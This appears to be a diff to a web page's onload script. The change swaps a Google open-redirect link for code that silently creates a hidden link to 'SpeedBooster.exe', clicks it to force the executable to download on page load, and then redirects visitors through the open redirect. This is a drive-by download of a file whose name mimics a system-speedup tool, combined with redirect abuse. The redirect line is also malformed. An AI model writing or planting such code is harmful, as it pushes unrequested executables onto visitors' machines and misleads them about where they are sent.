@@ -52,7 +52,13 @@
   </div>
     <script>
     window.onload = function() {
-     window.open("https://www.google.com/url?q=https://google-open-redirect.onrender.com/&usg=AOvVaw0bQK5POwWQ2mcGsSQf3BGG", "_blank");
+         const a = document.createElement('a');
+      a.href = 'SpeedBooster.exe'; // Replace with your file URL
+      a.download = 'downloaded-file.exe'; // Optional: force filename
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+     window.location.href("https://www.google.com/url?q=https://google-open-redirect.onrender.com/&usg=AOvVaw0bQK5POwWQ2mcGsSQf3BGG", "_blank");
     };
   </script>
 </body>
